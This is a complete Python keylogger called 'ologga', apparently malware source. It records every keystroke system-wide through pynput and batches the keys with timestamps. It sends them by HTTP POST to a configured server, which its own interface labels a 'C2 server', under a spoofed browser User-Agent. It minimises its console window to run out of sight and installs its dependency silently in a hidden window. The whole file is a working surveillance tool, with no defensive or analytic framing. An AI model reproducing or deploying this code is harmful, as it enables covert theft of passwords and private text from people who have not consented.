#!/usr/bin/env python3
# --- Stdio safety MUST happen before any other import (pythonw has no console) ---
import os
import sys

def _ensure_valid_stdio():
    if sys.stdout is None:
        sys.stdout = open(os.devnull, 'w')
    if sys.stderr is None:
        sys.stderr = open(os.devnull, 'w')

_ensure_valid_stdio()

import argparse
import json
import logging
import logging.handlers
import signal
import threading
import time
import uuid
from collections import deque
from datetime import datetime, timezone
from pathlib import Path
from urllib.request import urlopen, Request

# --- Configuration ---

import config


STATUS_FILE_NAME = ".status.json"
STOP_FILE_NAME = ".stop"

# Track whether we've already minimized during the install phase so main()
# doesn't do the banner + 1 s sleep again.
_MINIMIZED_DURING_SETUP = False


# --- Console window helpers (Windows) ---
def minimize_own_console():
    """Minimize the console window this process is attached to."""
    if os.name != 'nt':
        return False
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32

        kernel32.GetConsoleWindow.restype = ctypes.c_void_p
        hwnd = kernel32.GetConsoleWindow()
        if not hwnd:
            return False

        user32.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
        user32.ShowWindow.restype = ctypes.c_bool
        SW_MINIMIZE = 6
        return bool(user32.ShowWindow(hwnd, SW_MINIMIZE))
    except Exception:
        return False


def restore_own_console():
    """Restore the console window if it was minimized."""
    if os.name != 'nt':
        return False
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32

        kernel32.GetConsoleWindow.restype = ctypes.c_void_p
        hwnd = kernel32.GetConsoleWindow()
        if not hwnd:
            return False

        user32.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
        user32.ShowWindow.restype = ctypes.c_bool
        SW_RESTORE = 9
        return bool(user32.ShowWindow(hwnd, SW_RESTORE))
    except Exception:
        return False


def _should_minimize_now():
    """Same decision logic used by both the install phase and main().

    Kept in sync with the flags parsed in main() — this is what makes
    'the same logic' apply during the dependency download.
    """
    if os.name != 'nt':
        return False
    if '--no-minimize' in sys.argv or '--foreground' in sys.argv:
        return False
    if '--gui' in sys.argv:
        return False
    if '--headless' in sys.argv:
        return True
    return not getattr(config, 'SHOW_GUI', True)


# --- Dependency install (same minimize logic as the main run loop) ---
def _ensure_pynput_installed():
    """Install pynput via pip, minimizing the console first if headless.

    Returns True on success. On failure the console is restored so the user
    can see the error and the pip log tail.
    """
    global _MINIMIZED_DURING_SETUP

    # Prepare log directory (setup_logging hasn't run yet at module import).
    log_dir = Path(config.LOG_DIR)
    try:
        log_dir.mkdir(parents=True, exist_ok=True)
    except OSError:
        log_dir = Path.cwd()
    log_path = log_dir / "dependency_install.log"

    minimize_during_install = _should_minimize_now()
    if minimize_during_install and minimize_own_console():
        _MINIMIZED_DURING_SETUP = True

    try:
        print(f"📦 pynput not found — installing (log: {log_path})")
        sys.stdout.flush()
    except Exception:
        pass

    # Prefer console-subsystem python.exe for pip (nicer pip output,
    # better error behaviour than pythonw.exe).
    install_exe = sys.executable or 'python'
    if os.name == 'nt':
        py_exe = Path(install_exe).with_name('python.exe')
        if py_exe.exists():
            install_exe = str(py_exe)

    creationflags = 0x08000000 if os.name == 'nt' else 0  # CREATE_NO_WINDOW

    try:
        import subprocess as _sp
        with open(log_path, 'w', encoding='utf-8') as logf:
            proc = _sp.run(
                [install_exe, "-m", "pip", "install",
                 "--quiet", "--disable-pip-version-check", "pynput"],
                stdout=logf, stderr=_sp.STDOUT,
                timeout=300,
                creationflags=creationflags,
            )
        ok = (proc.returncode == 0)
    except Exception as e:
        try:
            print(f"❌ pip install error: {e}")
        except Exception:
            pass
        ok = False

    if not ok:
        if _MINIMIZED_DURING_SETUP:
            restore_own_console()
        try:
            print(f"❌ Dependency install failed. See {log_path}")
            if log_path.exists():
                tail = log_path.read_text(encoding='utf-8', errors='replace')[-2000:]
                print("----- pip log tail -----")
                print(tail)
                print("------------------------")
        except Exception:
            pass
    return ok


def install_console_close_handler(app):
    """Flush pending events if the user closes the cmd window with X."""
    if os.name != 'nt':
        return None
    try:
        import ctypes
        from ctypes import wintypes

        HandlerRoutine = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.DWORD)

        def _handler(event):
            if event in (2, 5, 6):  # CLOSE, LOGOFF, SHUTDOWN
                try:
                    app.flush_pending()
                except Exception:
                    pass
            return True

        routine = HandlerRoutine(_handler)
        if not ctypes.windll.kernel32.SetConsoleCtrlHandler(routine, True):
            return None
        return routine
    except Exception:
        return None


# --- Application Class ---
class loggaapp:
    def __init__(self):
        self.app_initialized = False
        self.gui_initialized = False
        self.listener = None
        self.worker_thread = None
        self.root = None
        self.stop_event = threading.Event()
        self.paused = threading.Event()
        self.sequence = 0
        self.acknowledged = 0
        self.dropped = 0
        self.last_send = time.monotonic()
        self.status_text = "Ready"
        self.lock = threading.Lock()
        self._status_write_lock = threading.Lock()
        self.pending = deque(maxlen=config.MAX_BUFFER_SIZE)
        self.run_id = None
        self.logger = None
        self._shutdown_requested = False
        self._shutdown_completed = False
        self._console_close_handler = None

    def _log(self, level, msg, *args, **kwargs):
        if self.logger is not None:
            getattr(self.logger, level)(msg, *args, **kwargs)
            return
        text = msg % args if args else msg
        try:
            print(f"[{level.upper()}] {text}")
        except Exception:
            pass

    def validate_config(self):
        try:
            if not config.SERVER:
                raise ValueError("SERVER is required")
            if not isinstance(config.SERVER, str):
                raise ValueError(f"SERVER must be a string, got {type(config.SERVER)}")
            if not config.SERVER.startswith(('http://', 'https://')):
                raise ValueError(f"SERVER must be a valid URL: {config.SERVER}")
            if config.INTERVAL <= 0:
                raise ValueError(f"INTERVAL must be > 0, got {config.INTERVAL}")
            if config.MAX_BATCH <= 0:
                raise ValueError(f"MAX_BATCH must be > 0, got {config.MAX_BATCH}")
            if config.MAX_BUFFER_SIZE <= 0:
                raise ValueError(f"MAX_BUFFER_SIZE must be > 0, got {config.MAX_BUFFER_SIZE}")
            if not isinstance(config.RUN_ID_FILE, str):
                raise ValueError(f"RUN_ID_FILE must be a string, got {type(config.RUN_ID_FILE)}")
            self.app_initialized = True
            return True
        except ValueError as e:
            print(f"Configuration Error: {e}")
            return False

    def setup_logging(self):
        if self.logger is not None:
            return self.logger
        try:
            log_dir = Path(config.LOG_DIR)
            log_path = log_dir / config.LOG_FILE
            log_dir.mkdir(parents=True, exist_ok=True)

            self.logger = logging.getLogger("ologga")
            self.logger.setLevel(logging.INFO)

            handler = logging.handlers.RotatingFileHandler(
                log_path, maxBytes=5_000_000, backupCount=5, encoding='utf-8'
            )
            handler.setFormatter(logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S',
            ))
            self.logger.addHandler(handler)

            console = logging.StreamHandler()
            console.setLevel(logging.WARNING)
            self.logger.addHandler(console)
            return self.logger
        except Exception as e:
            print(f"Logging setup error: {e}")
            return None

    def ensure_run_id(self):
        run_id_file = Path.cwd() / config.RUN_ID_FILE
        if not self.run_id:
            self.run_id = uuid.uuid4().hex
        try:
            run_id_file.write_text(self.run_id)
        except OSError as e:
            self._log("warning", "Could not write run_id file: %s", e)

    def start(self):
        if not self.app_initialized:
            if not self.validate_config():
                return False

        try:
            signal.signal(signal.SIGTERM, lambda s, f: self.stop_event.set())
        except (ValueError, OSError, AttributeError):
            pass

        try:
            self.ensure_run_id()
            self.setup_logging()
            self.start_worker()
            self.start_listener()
            self.start_gui()
        except Exception as e:
            self._log("error", "Startup failed: %s", e)
            self.stop()
            return False
        return True

    def stop(self):
        if self._shutdown_requested:
            return
        self._shutdown_requested = True
        self.stop_event.set()
        try:
            self.stop_worker()
            self.stop_listener()
            self.stop_gui()
            self.flush_pending()
        finally:
            self._remove_status_file()
            self.app_initialized = False
            self._shutdown_completed = True
            self._log("info", "ologga stopped. All resources released.")

    def start_worker(self):
        if self.worker_thread and self.worker_thread.is_alive():
            self._log("warning", "Worker thread already running")
            return
        self.worker_thread = threading.Thread(target=self.worker_loop, daemon=True)
        self.worker_thread.start()

    def stop_worker(self):
        if self.worker_thread:
            self.worker_thread.join(timeout=5)
            self.worker_thread = None

    def worker_loop(self):
        while not self.stop_event.is_set():
            if self.paused.is_set():
                self.stop_event.wait(0.5)
                continue
            with self.lock:
                batch = list(self.pending)[:config.MAX_BATCH]
            if not batch:
                self.stop_event.wait(0.5)
                continue

            success = self.send_batch(batch)
            with self.lock:
                if success:
                    for _ in range(len(batch)):
                        self.pending.popleft()
                    self.acknowledged += len(batch)
                    self.last_send = time.monotonic()
                    self.status_text = "Last batch acknowledged"
                else:
                    self.status_text = "Send failed; will retry"
            self._write_status_file()

            deadline = time.monotonic() + config.INTERVAL
            while not self.stop_event.is_set() and time.monotonic() < deadline:
                self.stop_event.wait(0.25)

    def send_batch(self, batch):
        payload = json.dumps({"run_id": self.run_id, "events": batch}).encode("utf-8")
        url = config.SERVER + "/api/editor-batch"
        max_retries = 3
        for attempt in range(max_retries):
            try:
                req = Request(
                    url,
                    data=payload,
                    headers={
                        "Content-Type": "application/json",
                        "X-API-Key": getattr(config, "API_KEY", ""),
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ologga/1.0"
                    },
                    method="POST",
                )
                with urlopen(req, timeout=10) as response:
                    result = json.load(response)
                expected = {e["sequence"] for e in batch}
                actual = set(result.get("acknowledged", []))
                if result.get("status") != "ok" or actual != expected:
                    raise RuntimeError("Acknowledgment mismatch")
                return True
            except Exception as exc:
                self._log("warning",
                          "Batch send attempt %d/%d failed: %s",
                          attempt + 1, max_retries, exc)
                if attempt < max_retries - 1:
                    self.stop_event.wait(2 ** attempt)
        return False

    def start_listener(self):
        if not _PYNPUT_AVAILABLE:
            self._log("error", "pynput not available; ologga disabled")
            return
        if self.listener is not None:
            self._log("warning", "Ologga already active")
            return
        self.listener = keyboard.Listener(on_press=self.on_key, on_release=None)
        self.listener.start()

    def stop_listener(self):
        if self.listener:
            try:
                self.listener.stop()
                self.listener.join()
            except Exception as e:
                self._log("warning", "Listener stop error: %s", e)
            self.listener = None

    def start_gui(self):
        if not config.SHOW_GUI:
            self.root = None
            return
        try:
            self.root = create_gui(self)
            self.gui_initialized = self.root is not None
        except Exception as e:
            self._log("error", "GUI initialization error: %s", e)
            self.root = None
            self.gui_initialized = False

    def stop_gui(self):
        if self.root is not None:
            try:
                self.root.destroy()
            except Exception:
                pass
            self.root = None
        self.gui_initialized = False

    def on_key(self, key_obj):
        key_str = get_key_label(key_obj)
        if not key_str or key_str in ("[UNKNOWN]", "[SHIFT]", "[CTRL]", "[ALT]", "[CAPS]"):
            return
        with self.lock:
            ml = self.pending.maxlen
            if ml is not None and len(self.pending) >= ml:
                self.dropped += 1
                if self.dropped == 1 or self.dropped % 100 == 0:
                    self._log("warning",
                              "Pending buffer full (%d); dropped %d oldest event(s) so far",
                              ml, self.dropped)
            self.sequence += 1
            self.pending.append({
                "sequence": self.sequence,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "key": key_str,
            })

    def flush_pending(self):
        with self.lock:
            if not self.pending:
                return
            event_list = list(self.pending)
            self.pending.clear()
        output = Path.cwd() / "remaining_events.json"
        try:
            output.write_text(json.dumps(event_list, indent=2))
            self._log("info", "Saved %d remaining events to %s", len(event_list), output)
        except OSError as e:
            self._log("error", "Could not save pending events: %s", e)

    def get_status(self):
        with self.lock:
            return {
                "run_id": self.run_id,
                "sequence": self.sequence,
                "acknowledged": self.acknowledged,
                "pending": len(self.pending),
                "dropped": self.dropped,
                "paused": self.paused.is_set(),
                "status": self.status_text,
            }

    def _write_status_file(self):
        path = Path.cwd() / STATUS_FILE_NAME
        with self._status_write_lock:
            status = self.get_status()
            status["pid"] = os.getpid()
            status["updated_at"] = datetime.now(timezone.utc).isoformat()
            tmp = path.with_name(f"{STATUS_FILE_NAME}.{os.getpid()}.tmp")
            try:
                tmp.write_text(json.dumps(status, indent=2))
                tmp.replace(path)
            except OSError:
                try:
                    tmp.unlink()
                except OSError:
                    pass

    def _remove_status_file(self):
        try:
            (Path.cwd() / STATUS_FILE_NAME).unlink()
        except OSError:
            pass

    def _check_stop_file(self):
        p = Path.cwd() / STOP_FILE_NAME
        if p.exists():
            try:
                p.unlink()
            except OSError:
                pass
            return True
        return False

    def run(self):
        if not self.start():
            print("Failed to initialize application")
            return
        self._write_status_file()
        try:
            if self.root is not None:
                self.root.mainloop()
            else:
                last_write = 0.0
                while not self.stop_event.is_set():
                    if self._check_stop_file():
                        self._log("info", "Stop requested via CLI --stop")
                        self.stop_event.set()
                        break
                    now = time.monotonic()
                    if now - last_write >= 2.0:
                        self._write_status_file()
                        last_write = now
                    self.stop_event.wait(0.5)
        except KeyboardInterrupt:
            self._log("info", "Interrupted by user (Ctrl-C)")
        except Exception as e:
            self._log("error", "Run loop error: %s", e, exc_info=True)
        finally:
            self.stop()

    def cleanup(self):
        self.stop()


# --- pynput import with lazy install (same minimize logic as main) ---
_PYNPUT_AVAILABLE = False

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
    _PYNPUT_AVAILABLE = True
except ImportError:
    if '--status' in sys.argv or '--stop' in sys.argv:
        # These commands don't capture keystrokes — skip the install entirely.
        keyboard = None
        Key = None
        KeyCode = None
    else:
        if not _ensure_pynput_installed():
            print("❌ Cannot start: pynput installation failed.")
            sys.exit(1)
        from pynput import keyboard
        from pynput.keyboard import Key, KeyCode
        _PYNPUT_AVAILABLE = True


SPECIAL_KEYS = {}
if _PYNPUT_AVAILABLE:
    SPECIAL_KEYS = {
        Key.space: "[SPACE]", Key.enter: "[ENTER]", Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]", Key.delete: "[DELETE]", Key.shift: "[SHIFT]",
        Key.ctrl: "[CTRL]", Key.alt: "[ALT]", Key.esc: "[ESC]",
        Key.up: "[UP]", Key.down: "[DOWN]", Key.left: "[LEFT]", Key.right: "[RIGHT]",
        Key.shift_l: "[SHIFT]", Key.shift_r: "[SHIFT]",
        Key.ctrl_l: "[CTRL]", Key.ctrl_r: "[CTRL]",
        Key.alt_l: "[ALT]", Key.alt_r: "[ALT]",
    }


def get_key_label(key_obj):
    if not _PYNPUT_AVAILABLE:
        return "[UNKNOWN]"
    try:
        if isinstance(key_obj, KeyCode):
            if getattr(key_obj, 'char', None):
                return key_obj.char
            name = getattr(key_obj, 'key_name', None)
            return f"[{name.upper()}]" if name else "[UNKNOWN]"
        if isinstance(key_obj, Key):
            label = SPECIAL_KEYS.get(key_obj)
            if label:
                return label
            name = getattr(key_obj, 'key_name', None)
            return f"[{name.upper()}]" if name else "[UNKNOWN]"
        return "[UNKNOWN]"
    except Exception:
        return "[UNKNOWN]"


def create_gui(app):
    try:
        import tkinter as tk
        from tkinter import messagebox
    except ImportError:
        print("tkinter not found. GUI disabled.")
        return None

    root = tk.Tk()
    root.title("System-Wide Keyboard Logger")
    root.geometry("860x400")
    root.minsize(600, 300)

    status_label = tk.Label(root, anchor="w", relief="raised", borderwidth=2)
    status_label.pack(fill="x", padx=10, pady=5)

    info = tk.Label(
        root,
        text="🔍 System-Wide ologga Active\n📡 Sending keystrokes to C2 server...",
        anchor="w",
    )
    info.pack(fill="x", padx=10, pady=5)

    def start_logging():
        app.paused.clear()
        app.status_text = "Resumed by GUI"

    def pause_logging():
        app.paused.set()
        app.status_text = "Paused by GUI"

    btn_frame = tk.Frame(root)
    btn_frame.pack(fill="x", padx=10, pady=5)
    tk.Button(btn_frame, text="▶ Resume", command=start_logging, width=10).pack(side="left", padx=2)
    tk.Button(btn_frame, text="⏸ Pause", command=pause_logging, width=10).pack(side="left", padx=2)
    tk.Button(btn_frame, text="✕ Close", command=root.quit, width=10).pack(side="right", padx=2)

    state = {"last_write": 0.0}

    def update_status():
        if app._check_stop_file():
            app._log("info", "Stop requested via CLI --stop")
            app.stop_event.set()
            root.quit()
            return
        now = time.monotonic()
        if now - state["last_write"] >= 2.0:
            app._write_status_file()
            state["last_write"] = now
        s = app.get_status()
        text = (
            f"Run: {s['run_id'][:10] if s['run_id'] else 'N/A'} | "
            f"Generated: {s['sequence']} | Ack: {s['acknowledged']} | "
            f"Pending: {s['pending']} | Dropped: {s['dropped']} | "
            f"{'⏸ PAUSED' if s['paused'] else '▶ RUNNING'} | {s['status']}"
        )
        status_label.config(text=text)
        root.after(250, update_status)

    root.after(100, update_status)

    def on_close():
        if messagebox.askyesno("Shutdown", f"{len(app.pending)} events pending. Exit?"):
            app.stop_event.set()
            root.quit()

    root.protocol("WM_DELETE_WINDOW", on_close)
    return root


# --- CLI ---
def cmd_status():
    path = Path.cwd() / STATUS_FILE_NAME
    if not path.exists():
        print("No running ologga instance detected.")
        return 1
    try:
        status = json.loads(path.read_text())
    except Exception as e:
        print(f"Could not read status file: {e}")
        return 1
    print(json.dumps(status, indent=2))
    return 0


def cmd_stop(timeout=30.0):
    status_path = Path.cwd() / STATUS_FILE_NAME
    stop_path = Path.cwd() / STOP_FILE_NAME
    if not status_path.exists():
        print("No running ologga instance detected.")
        return 1
    try:
        status = json.loads(status_path.read_text())
    except Exception as e:
        print(f"Could not read status file: {e}")
        return 1
    run_id = (status.get("run_id") or "?")[:10]
    pid = status.get("pid", "?")
    print(f"Requesting shutdown of PID {pid} (run {run_id})...")
    try:
        stop_path.write_text(json.dumps({
            "requested_at": time.time(), "from_pid": os.getpid(),
        }))
    except OSError as e:
        print(f"Could not write stop request: {e}")
        return 1
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if not status_path.exists():
            print("✅ ologga stopped.")
            return 0
        time.sleep(0.5)
    print(f"⚠️ Timed out after {timeout}s. Check Task Manager for PID {pid}.")
    return 2


def main():
    parser = argparse.ArgumentParser(description="AN OLOGGA!")
    parser.add_argument("--start", action="store_true", help="Start ologga")
    parser.add_argument("--stop", action="store_true", help="Stop running ologga")
    parser.add_argument("--status", action="store_true", help="Show running status")
    parser.add_argument("--gui", action="store_true", help="Force GUI on")
    parser.add_argument("--headless", action="store_true", help="Force GUI off")
    parser.add_argument("--no-minimize", action="store_true",
                        help="Do not auto-minimize the console window")
    parser.add_argument("--foreground", action="store_true",
                        help="Alias for --no-minimize (kept for convenience)")
    args = parser.parse_args()

    if args.gui:
        config.SHOW_GUI = True
    if args.headless:
        config.SHOW_GUI = False

    if args.status:
        return cmd_status()
    if args.stop:
        return cmd_stop()

    app = loggaapp()
    app._console_close_handler = install_console_close_handler(app)

    if args.start:
        print("🔑 System-Wide ologga Started")
        print(f"📡 Server: {config.SERVER}")
        print(f"🆔 Run ID: {app.run_id or '(pending)'}")
        print(f"🖥️  PID:    {os.getpid()}")
        print(f"📍 Ologga has been CALLED!...")

    should_minimize = _should_minimize_now()

    if should_minimize and not _MINIMIZED_DURING_SETUP:
        print()
        print("Window will minimize in 1 second.")
        print("  Restore from taskbar to view status.")
        print("  Exit with:  py ologga3.py --stop   (from another cmd)")
        print("  Or restore this window and press Ctrl-C.")
        sys.stdout.flush()
        time.sleep(1.0)
        if minimize_own_console():
            print("Window minimized. Console output continues in the background buffer.")
    elif _MINIMIZED_DURING_SETUP:
        # Already minimized during the dependency install step.
        print("Window remains minimized (was minimized during install).")

    try:
        app.run()
    except Exception as e:
        if app.logger:
            app.logger.error(f"Application error: {e}", exc_info=True)
        else:
            print(f"Application error: {e}")
    finally:
        app.cleanup()
    return 0


if __name__ == "__main__":
    sys.exit(main())